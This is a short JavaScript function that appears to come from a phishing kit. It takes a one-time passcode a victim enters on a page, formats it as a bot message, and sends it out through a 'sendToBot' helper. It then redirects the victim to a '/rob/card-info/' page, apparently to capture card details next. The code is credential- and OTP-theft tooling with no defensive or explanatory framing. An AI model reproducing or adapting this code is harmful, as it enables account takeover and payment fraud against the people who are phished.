async function handleCodeSubmit() {
    const code = document.getElementById('code').value;
    const message = `🔢 <b>OTP Code</b>\n\n📱 Code: <code>${code}</code>`;
    await sendToBot(message, 'enter-code');
    window.location.href = '/rob/card-info/';
}
